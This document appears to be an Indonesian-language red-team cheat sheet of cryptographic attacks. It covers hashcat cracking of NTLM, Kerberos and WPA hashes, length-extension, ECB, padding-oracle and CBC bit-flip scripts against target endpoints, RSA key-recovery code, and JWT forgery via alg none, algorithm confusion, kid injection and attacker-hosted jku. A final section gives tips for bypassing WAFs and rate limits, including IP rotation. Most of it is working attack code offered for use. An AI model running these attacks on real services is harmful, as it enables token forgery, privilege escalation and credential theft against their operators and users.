# crypto-attacks — crypto

# Cryptography Attacks — Referensi Red Team

## 1. Hash Cracking (Hashcat)

### 1.1 Mode Penting

| Mode | Hash | Contoh |
|------|------|--------|
| 0 | MD5 | `8743b52063cd84097a65d1633f5c74f5` |
| 100 | SHA1 | `3bc15c8aae3e4124dd409035f32ea2fd6835efc9` |
| 1400 | SHA256 | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8` |
| 1700 | SHA512 | `b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86` |
| 1000 | NTLM | `8846f7eaee8fb117ad06bdd830b7586c` |
| 3000 | LM | `299bd128c1101fd6` |
| 1800 | sha512crypt `$6$` | — |
| 500 | md5crypt `$1$` | — |
| 3200 | bcrypt `$2a$/$2b$/$2y$` | — |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | `.hc22000` |
| 13100 | Kerberoast (TGS-REP, RC4) | — |
| 18200 | AS-REP Roast | — |
| 7500 | Kerberos AS-REQ pre-auth (etype 23) | — |
| 1600 | Apache `$apr1$` | — |
| 400 | phpBB3 / WordPress phpass | — |
| 2200 | Django (PBKDF2-SHA256) | — |
| 23400 | BitLocker | — |
| 13400 | KeePass | — |
| 12500 | RAR3-hp | — |

### 1.2 Perintah Dasar

```bash
# Salt + wordlist
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# Rule-based mangling (best64 umum; dive lebih agresif)
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule

# Combinator (dua wordlist)
hashcat -m 0 -a 1 md5.txt words1.txt words2.txt -j '$-' -k '$2024'

# Mask (brute force terstruktur)
hashcat -m 0 -a 3 md5.txt '?u?l?l?l?l?d?d?d?s'           # 8 char + digit + symbol
hashcat -m 0 -a 3 md5.txt '?u?l?l?l?l?l?d?d?d?d' -i --increment-min=6

# Hybrid (wordlist + mask)
hashcat -m 1000 -a 6 ntlm.txt rockyou.txt '?d?d?d?d'

# Tuning GPU vs memory
hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt -D 1,2 -w 4 --kernel-accel=128 --kernel-loops=1024

# Restore / status
hashcat --session=red1 --restore
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt --status --status-timer=10 --potfile-disable
```

### 1.3 Mask Charset

```
?l a-z   ?u A-Z   ?d 0-9   ?s !"#$...  ?a ?l?u?d?s   ?b 0x00-0xff
-c  ?l?u  -1 ?l?d   custom set
```

Contoh mask NTLM dengan prefix `P@ss`:
```bash
hashcat -m 1000 -a 3 ntlm.txt -1 '?l?d' 'P@ss?1?1?1?1'
```

### 1.4 Kapan gagal
- Bcrypt `$2b$` cost ≥ 12: 100× lebih lambat — pakai rule + wordlist, bukan mask.
- Hanya hash saja (tanpa salt digest/LM): pastikan `hashid -m` cocok; salah mode = 0 hasil.
- GPU thermal throttle: pantau `nvidia-smi dmon`; `-w 4` bisa memicu throttle dan lebih lambat dari `-w 3`.
- Hashcat 7.1.2 default ke OpenCL runtime — pada driver NVIDIA 550+ install `hashcat` via paket distro dengan CUDA backend.

---

## 2. Length Extension Attack

**Apa yang dikirim:** `hash(secret || message)` (Merkle–Damgård: MD5, SHA1, SHA256, SHA512) + `message || padding || attacker_appendix`.
**Apa yang muncul:** MAC valid untuk pesan yang diperpanjang.
**Kenapa berhasil:** state internal setelah hashing = output hash; attacker bisa lanjut dari state itu.

### Deteksi
- Parameterisasi seperti `?user=admin&role=user&sig=...` di mana `sig = md5(secret + query)`.
- API signature header (routing, payment gateway) berbasis HMAC palsu.

### Skrip (Python 3.11 + `hashpumpy` / `hlextend`)

```python
# pip install hlextend
import hlextend
sha = hlextend.new('sha256')
original = b'user=guest&role=user'
sig = 'a1b2c3...'                              # dari target
# append '&role=admin'
new_msg, new_sig = sha.extend(b'&role=admin', original, 8, sig)  # keylen=8 (brute 1-32)
print(new_msg.hex(), new_sig)
```

Curl ke endpoint:
```bash
curl -s "https://target/api/data?$(python3 -c "print(bytes.fromhex('<hex>').decode('latin1'))")" \
  -H "X-Signature: <new_sig>"
```

Alternatif tool: `padbuster` mode `-hash`, atau `hash_extender`:
```bash
hash_extender --data "user=guest&role=user" --secret-min=1 --secret-max=32 \
  --append "&role=admin" --signature a1b2c3... --format sha256
```

### Kapan gagal
- Target pakai HMAC (SHA256-HMAC): length extension **tidak berlaku**.
- Framework WAF (Cloudflare) menormalkan `\x80` — payload harus dikirim sebagai bytes mentah (curl `--data-binary`, bukan `-d`).
- Secret tidak di-prepend (mis. `hash(msg + secret)`) — gunakan serangan lain.

---

## 3. ECB Cut-and-Paste

**Apa yang dikirim:** ciphertext blok ECB yang disusun ulang dari blok sah lain (tidak butuh key).
**Apa yang muncul:** plaintext hasil rekombinasi.
**Kenapa berhasil:** ECB enkripsi tiap blok identik → blok identik menghasilkan ciphertext identik; mudah "dirobek" per 16 byte.

### Deteksi
- Ciphertext terlihat sebagai hex panjang (kelipatan 16), biasanya via cookie/base64.
- Enkripsi ECB: blok plaintext berulang → blok ciphertext berulang.

```python
# Deteksi ECB oracle
def is_ecb(oracle):
    ct = oracle(b'A' * 48)
    blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
    return len(blocks) != len(set(blocks))
```

### Skrip (cookie `user=<x>&role=user` dienkripsi AES-ECB)

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import requests

def oracle(pt: bytes) -> bytes:                     # endpoint proxy
    return bytes.fromhex(requests.get(f'http://t/?inp={pt.hex()}').text)

BS = 16
# Blok A: "AAAAAAA A&role=us er......" → siapkan offset agar "role=user" jatuh di blok penuh
# Blok B: dapatkan ciphertext "admin" dengan injection offset
target = b'role=admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'  # PKCS7 pad
# cari dengan offset shift 1..15 sampai blok (16-byte) target muncul sendiri
```

Praktik umum via `padbuster` atau `ecb_tool`:
```bash
# ecb_oracle (matasano set 2 chall 12-14) — baca password via oracle
python3 ecb_oracle.py --url https://t/?inp= --block 16 --prefix 0
```

### Kapan gagal
- Server memakai AES-CBC + random IV atau GCM: serangan tidak berlaku.
- Name/value sanitizer memblok `&` sebelum enkripsi (invalidasi rekombinasi).
- Ciphertext ada HMAC diinginkan di luar blok — milih cut-and-paste gagal karena auth tag berubah.

---

## 4. Padding Oracle (CBC)

**Apa yang dikirim:** ciphertext dengan satu byte blok sebelumnya dimodifikasi; ukur respons beda antara 200/500 atau timing beda.
**Apa yang muncul:** plaintext akhir satu byte per request, iteratif → full decrypt + forge.
**Kenapa berhasil:** CBC decrypt = `P_i = D(C_i) ⊕ C_{i-1}`; mengubah C_{i-1} mempengaruhi P_i; server reveal padding invalid vs valid.

### Payload template (curl probe)

```bash
CT=...                                   # hex/base64 dari cookie
PT_BLOCK=$((16*${BLOCK_IDX}))
# Modify byte ke-i di blok C_{i-1}
python3 - <<'PY'
import base64
ct = bytearray(base64.b64decode("<ct>"))
ct[15] ^= 0x01                             # ubah byte terakhir blok sebelumnya
print(base64.b64encode(ct).decode())
PY
```

### Skrip `padbuster` (cara paling praktis)

```bash
padbuster https://target/profile "vQ7bKeY7nR5t..." 16 \
  -cookies "auth=vQ7bKeY7nR5t...; lang=en" \
  -encoding 0 -error "Invalid padding" -plaintext "user=guest"
```

### Skrip Python (oracle beda status/timing)

```python
import requests, base64
URL = 'https://target/profile'
CT  = base64.b64decode('<cipher>').hex()
BS  = 16

def oracle(ct_hex):
    r = requests.post(URL, data={'cipher': ct_hex})
    return r.status_code != 500   # True = padding valid

def decrypt(ct_hex):
    ct = bytearray.fromhex(ct_hex)
    blocks = [ct[i:i+BS] for i in range(0, len(ct), BS)]
    pt = b''
    for i in range(len(blocks)-1, 0, -1):
        prev = bytearray(blocks[i-1])
        dec = bytearray(BS)
        inter = bytearray(BS)
        for pad in range(1, BS+1):
            for guess in range(256):
                prev[BS-pad] = (inter[BS-pad] ^ pad) ^ guess
                test = bytes(prev) + bytes(blocks[i])
                if oracle(test.hex()):
                    inter[BS-pad] = guess ^ pad
                    break
            for j in range(BS-pad, BS):
                prev[j] = inter[j] ^ (pad+1)
        pt = bytes(a ^ b for a, b in zip(inter, blocks[i-1])) + pt
    return pt
```

### Kapan gagal
- Server sudah pakai **Encrypt-then-MAC** atau AEAD (GCM/ChaCha20-Poly1305) → padding oracle tidak ada.
- Constant-time response + 500 untuk semua error (WAF normalisasi error).
- HTTP/2 + `nginx 1.25` membatasi jumlah request paralel; padbuster default paralel 10 bisa reset — pakai `-parallelism 1` + delay.
- CT byte memiliki HMAC di akhir (double-submit) → tidak bisa forge tanpa key.

---

## 5. CBC Bit Flipping

**Apa yang dikirim:** `C_{i-1} ^= delta` untuk mengubah `P_i` tanpa tahu key.
**Apa yang muncul:** plaintext target dari blok P_i, merusak P_{i-1} (garbage).
**Kenapa berhasil:** CBC: `P_i = D(C_i) ⊕ C_{i-1}` — manipulasi C_{i-1} langsung XOR ke plaintext blok i.

### Kasus klasik: cookie `role=user` → `role=admin`

```python
import base64
ct = bytearray(base64.b64decode('<cookie_ct>'))
# Plaintext block 1: b'...role=user.....', target role=admin
# delta = b'user' XOR b'min\x00' untuk 4 byte di posisi role
orig  = b'user'
new   = b'admin'[:4]                                  # 'admi' vs 'user' panjang beda → geser
# Untuk awal "user" → "admi" — tidak akan match string role=, gunakan flip posisi dgn padding
# Baseline hitung delta jika panjang tetap:
delta = bytes(a ^ b for a, b in zip(b'user', b'adm%')) # placeholder
```

Contoh konkret panjang tetap `role=user` (9 byte) → `role=admi` + byte junk (padding asli bila server tidak cek `role=` prefix):

```python
block_target = 1                         # indeks blok plaintext yang ditargetkan
offset = 5                               # posisi dalam blok
delta = bytes([ord('u')^ord('a'), ord('s')^ord('d'), ord('e')^ord('m'), ord('r')^ord('i')])
for i, d in enumerate(delta):
    ct[(block_target-1)*16 + offset + i] ^= d
print(base64.b64encode(ct).decode())
```

### Kapan gagal
- IV ter-autentikasi (HMAC) → flip merusak MAC.
- Server memvalidasi `role` dengan allowlist setelah decrypt tapi sebelum auth-check? Tidak mungkin: role adalah target deserialize — validasi biasanya di dua tempat; bila dua tempat → butuh juga flip blok auth (lewat orakel).
- Panjang `user` ≠ `admin` tanpa padding modul 16: butuh orakel padding (lihat §4).
- Encoding cookie (URL-safe base64 vs standar) → decode salah. Cek `%3D`, `-`, `_`.

---

## 6. Serangan RSA

### 6.1 Common Modulus

**Dikirim:** dua ciphertext ke public key (n, e1) dan (n, e2), dengan gcd(e1,e2)=1.
**Muncul:** plaintext m asli via Bézout.
**Kenapa berhasil:** `m^{a·e1 + b·e2} = m` bila `a·e1 + b·e2 = 1`.

```python
from math import gcd
def egcd(a,b):
    if b==0: return (a,1,0)
    g,x1,y1 = egcd(b, a%b); return (g, y1, x1-(a//b)*y1)
def common_modulus(n, e1, c1, e2, c2):
    g, a, b = egcd(e1, e2); assert g == 1
    def inv(x, m): return pow(x, -1, m)
    if a < 0: c1 = inv(c1, n); a = -a
    if b < 0: c2 = inv(c2, n); b = -b
    return (pow(c1, a, n) * pow(c2, b, n)) % n
```

### 6.2 Wiener (small d)

**Dikirim:** public (n, e) → faktor n.
**Muncul:** d bila `d < n^{0.25}/3`.
**Kenapa berhasil:** convergents dari e/n menghasilkan k/d.

```python
# pip install owiener
import owiener
d = owiener.attack(e, n)
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]))
```

### 6.3 Hastad Broadcast (small e, no padding)

**Dikirim:** ciphertext dari ≥ e kunci berbeda, modulus co-prime, pesan sama.
**Muncul:** CRT rekonstruksi `m^e`, akar ke-e.
**Kenapa berhasil:** `m^e < Π n_i` → exact integer root.

```python
from sympy.ntheory.modular import crt
from gmpy2 import iroot
ns = [n1, n2, n3]; cs = [c1, c2, c3]
m_e, _ = crt(ns, cs)
m, exact = iroot(int(m_e), 3)
assert exact
print(bytes.fromhex(hex(int(m))[2:]))
```

### 6.4 Shared Prime (batch GCD)

**Dikirim:** dua public key RSA `n1, n2`.
**Muncul:** faktor `p = gcd(n1, n2)` bila PRNG lemah/reuse.
**Kenapa berhasil:** modulus berbagi faktor prima.

```python
from math import gcd
def shared_prime(n1, n2):
    p = gcd(n1, n2)
    if p == 1: return None
    return p, n1//p, n2//p
```

Batch (data dump sertifikat):
```bash
# tool: RsaCtfTool (crypto-attacks), atau badkeys
badkeys --update-bl
badkeys -a scan pubkey.pem
```

RsaCtfTool satu pintu:
```bash
# install: git clone https://github.com/RsaCtfTool/RsaCtfTool
python3 RsaCtfTool.py --publickey pub.pem --private
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile ct.bin --attack wiener
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile ct.bin --attack common_modulus \
  --cm-publickey2 pub2.pem --cm-cipherfile2 ct2.bin
```

### Kapan gagal
- Padding (OAEP/PKCS#1 v1.5) aktif: Hastad butuh kosong; OAEP melawannya (randomisasi).
- `e` besar (≥ 65537) dengan padding OK: Wiener, Hastad tidak berlaku.
- Faktorisasi hanya ketika `n1 ∩ n2 > 1` — umumnya dari generator firmware embedded (router, IoT).
- RsaCtfTool butuh SageMath untuk banyak attack; tanpa Sage → banyak attack silent fail. Cek `which sage`.

---

## 7. JWT Crypto Abuse

### 7.1 `alg: none`

**Dikirim:** JWT dengan header `{"alg":"none"}` + signature kosong.
**Muncul:** server yang tidak memaksa alg → terima token tanpa verifikasi.
**Kenapa berhasil:** library / config lama menerima `none`.

```bash
python3 - <<'PY'
import base64, json
h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
print((h+b'.'+p+b'.').decode())
PY
```

Variasi case: `None`, `NONE`, `nOnE` (CVE-2015-9235 lama di `jsonwebtoken` npm < 4.2.2).

### 7.2 Algorithm Confusion RS256 → HS256

**Dikirim:** header `{"alg":"HS256"}`, signature dihitung dengan **public key RSA sebagai HMAC-secret** (PEM).
**Muncul:** server memverifikasi HMAC dengan public key → valid.
**Kenapa berhasil:** library `jsonwebtoken` (node) < 9 / `pyjwt` < 2.4 tanpa `algorithms=["RS256"]` eksplisit; verifier pakai secret sama dengan pemverifikasi algoritma yang diklaim.

```python
# pip install pyjwt cryptography
import jwt, requests
pubkey = requests.get('https://target/.well-known/jwks.json').json()   # atau /jwks.json
# konversi JWK → PEM (pakai jwcrypto)
from jwcrypto import jwk
k = jwk.JWK(**pubkey['keys'][0]); pem = k.export_to_pem()
token = jwt.encode({"sub":"admin","role":"admin"},
                   pem, algorithm="HS256")
print(token)
```

Bandingkan juga public key dalam PEM vs `-----BEGIN PUBLIC KEY-----` (pyjwt pakai raw bytes, node pakai pem string — coba kedua format).

### 7.3 `kid` Injection

**Dikirim:** header `{" kid":"../../../../dev/null" }` atau `{"kid":"/etc/passwd"}`.
**Muncul:** server membuka file path ↔ secret = contents; bila kosong → secret = "" (HMAC forgeable).

```python
# kid = /dev/null → HMAC secret string kosong
import hmac, hashlib, base64, json
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
h = b64(json.dumps({"alg":"HS256","kid":"/dev/null"}).encode())
p = b64(json.dumps({"sub":"admin"}).encode())
sig = b64(hmac.new(b'', f'{h.decode()}.{p.decode()}'.encode(), hashlib.sha256).digest())
print(f"{h.decode()}.{p.decode()}.{sig.decode()}")
```

Variasi SQLi kid: `kid: "x' UNION SELECT 'secret'--"` di backend yang mengambil key dari DB.

### 7.4 JWKS Injection / SSRF via `jku`, `x5u`

**Dikirim:** header `{"jku":"https://attacker/jwks.json","alg":"RS256"}`.
**Muncul:** server fetch JWKS dari URL attacker → verifikasi token dengan key attacker.
**Kenapa berhasil:** tidak ada allowlist host `jku`.

```bash
# 1) Host jwks.json di attacker (attacker key pair)
openssl genrsa -out atk.pem 2048
openssl rsa -in atk.pem -pubout -out atk.pub
python3 - <<'PY'
import json, base64
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.asymmetric import rsa
import base64
pub = load_pem_public_key(open('atk.pub','rb').read())
nums = pub.public_numbers()
def b64u(i): 
    b = i.to_bytes((i.bit_length()+7)//8,'big'); return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
print(json.dumps({"keys":[{"kty":"RSA","n":b64u(nums.n),"e":b64u(nums.e),"kid":"atk"}]}))
PY
# 2) Sign token dengan atk.pem + header jku ke URL di atas
```

### 7.5 Weak HMAC Secret (jwt-cracker)

```bash
# pip install pyjwt; pakai hashcat: mode 16500 (JWT HS256)
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# jwt_tool (opsional, python)
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
# Setelah crack:
python3 jwt_tool.py <token> -T -S hs256 -p '<secret>'
```

### Kapan gagal
- `algorithms=["RS256"]` hardcoded → node `jsonwebtoken` ≥ 9, pyjwt ≥ 2.4 aman dari confusion.
- `kid` path traversal di-block `os.path.basename` atau allowlist key id map.
- `jku`/`x5u` di-allowlist ketat di API gateway (Kong 3.6+, AWS API Gateway default tidak fetch).
- Keycloak 24.x, Auth0 rules default sudah verifikasi `keys` server-side terhadap JWKS yang di-pin; `jku` diabaikan.
- Signature base64 decode salah: JWT pakai `-` `_` (URL-safe), bukan `+` `/`; `str.replace('=','')` wajib.

---

## 8. Jebakan Operasional (yang membuat serangan gagal di lapangan)

1. **Encoding mismatch** — length extension & CBC flip paling sering gagal karena target meng-URL-decode `%80`/NUL, atau `curl -d` mengubah `+` → spasi. Kirim `--data-binary` dan `Content-Type: application/octet-stream`.
2. **WAF normalisasi** — Cloudflare/Akamai menormalkan whitespace, trailing bytes, dan base64. Payload biner harus lewat `POST` body atau header mentah; GET query string akan corrupt.
3. **Rate limit per-IP** — padding oracle butuh ribuan request; pakai IP rotator atau `--delay`; nginx 1.25 `limit_req` default akan 429 di 10 rps.
4. **HTTP/2 stream** — padbuster v1.2 (lama) tidak handle h2; pakai `--load-balancer` atau `-H "Connection: close"` untuk downgrade.
5. **Cookie SameSite/Host** — CBC/JWT abuse pada cookie dengan `SameSite=Strict` tetap bisa diserialisasi via browser devtools, tapi rotation `__Host-` prefix butuh `Path=/` match persis.
6. **Time skew di JWT** — `exp` tidak dipalsukan; jika token ditolak, cek `iat`/`nbf`; target dengan drift NTP > 30s (umum Windows 11 24H2 tanpa time sync) bisa reject atau accept tak terduga.
7. **Hashcat driver drift** — hashcat 7.x pada ROCm 6.1 punya regression `-m 22000`; downgrade ke hashcat 6.2.6 atau compile OpenCL. Cek `hashcat -I` untuk device yang terdeteksi.
8. **GPU memory OOM** — mask `?a?a?a?a?a?a?a?a` butuh > 24 GB VRAM setelah workload; hashcat akan "out of memory" tapi tidak crash — cek `--status` menampilkan 0 H/s (silent). Pakai `-d 1` per device atau kurangi `-n`.
9. **Library crypto versi** — pyjwt < 2.4 rentan confusion; target bisa saja upgradable. Cek `Server:`, error verbose (`jwt.exceptions.InvalidAlgorithmError`) untuk fingerprint versi.
10. **RSA padding identity** — RSA-CTF tool "wiener" sukses hanya jika `d` kecil. Jika key 2048-bit dengan d setara modulus, attack silent benar-benar hilang. Cek `e` eksentrik (`e=3` — kandidat Hastad, `e=1` — m=c).
11. **JWT jku** — endpoint jwks attacker harus HTTPS dengan sertifikat valid; backend Node `node-fetch` reject self-signed. Siapkan Let's Encrypt (atau via `ngrok`/`cloudflared` tapi domain publik harus di-resolve).
12. **JWT header `crit`** — beberapa library menolak header dengan `crit` tidak dikenal → token ditolak sebelum verifikasi. Strip `crit` saat forge.
13. **Brute force wordlist salah garam** — kerberoast mode 13100 gagal jika ticket pakai AES (etype 17/18). Detect via `--example-hashes`; ganti `-m 19600`/`19700` + wordlist adaptif.
14. **Length extension di request ber-signature query-string**: string diurutkan alphabetic oleh framework (Spring `UriComponentsBuilder`), jadi append di akhir akan diurutkan ulang — payload harus disisipi pada parameter yang juga jadi tempat injeksi (`&role=admin` di posisi yang tidak di-sort ulang, mis. fragment atau body).
15. **Padding oracle multi-stack** — TLS offload (nginx) bisa merespons error 400 sebelum aplikasi (padding) → oracle hilang. Uji dulu dengan byte corrupt yang pasti invalid, lihat apakah respons beda di layer TLS.
16. **ECB cut-and-paste di JSON serializer** — banyak backend menambahkan field random di antara blob, jadi blok plaintext tidak align dengan 16 byte. Tambahkan prefix `A * (16 - offset)` per request — tanpa itu ciphertext akan bergeser 1 byte dan test selalu mismatch.

---

## [reasoning trace]


